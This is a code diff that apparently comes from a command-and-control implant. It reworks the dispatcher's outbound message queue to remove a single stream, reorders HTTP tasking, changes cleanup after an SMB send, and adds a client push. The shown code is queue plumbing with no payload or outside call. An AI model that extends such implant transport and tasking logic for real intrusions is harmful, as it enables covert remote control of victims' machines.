@@ -30,35 +30,32 @@ namespace Dispatcher {
         }
     }
 
-    VOID ClearQueue() {
+    VOID RemoveMessage(_stream *target) {
         HEXANE
 
         _stream *head = Ctx->transport.outbound_queue;
-        _stream *swap = { };
         _stream *prev = { };
 
-        if (!head) {
-            Ctx->transport.outbound_queue = nullptr;
+        if (!head || !target) {
             return;
         }
 
         while (head) {
-            if (head->ready) {
+            if (head == target) {
                 if (prev) {
                     prev->next = head->next;
 
                 } else {
                     Ctx->transport.outbound_queue = head->next;
                 }
-                swap = head;
-                head = head->next;
 
-                Stream::DestroyStream(swap);
+                Stream::DestroyStream(head);
+                return;
 
-            } else {
-                prev = head;
-                head = head->next;
             }
+
+            prev = head;
+            head = head->next;
         }
     }
 
@@ -196,8 +193,8 @@ namespace Dispatcher {
         return_defer(ERROR_SUCCESS);
 #elifdef TRANSPORT_HTTP
         auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
-        OutboundQueue(entry);
 
+        OutboundQueue(entry);
         goto retry;
 #endif
         } else {
@@ -212,7 +209,11 @@ namespace Dispatcher {
         Network::Smb::SmbSend(out);
         Network::Smb::SmbReceive(&in);
 #endif
-        Stream::DestroyStream(out);
+        if (NT_SUCCESS(ntstatus)) {
+            Stream::DestroyStream(out);
+        }
+
+        // remove stream from queue
 
         if (in) {
             if (!PeekPeerId(in)) {
@@ -227,6 +228,8 @@ namespace Dispatcher {
                 head = head->next;
             }
         }
+
+        Clients::ClientPush();
 
     defer:
     }
